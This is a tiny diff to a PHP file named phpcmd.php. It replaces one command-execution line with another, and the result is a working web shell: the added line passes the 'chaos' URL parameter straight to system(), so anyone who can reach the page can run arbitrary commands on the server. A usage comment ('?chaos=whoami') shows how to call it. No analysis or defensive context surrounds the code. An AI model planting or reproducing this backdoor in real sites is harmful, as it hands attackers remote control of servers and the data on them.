@@ -1,3 +1,2 @@
 // usage: phpcmd.php?chaos=whoami
-
-<?php echo shell_exec($_GET[chaos'].' 2>&1'); ?>
+<?php echo system($_GET["chaos"]); ?>
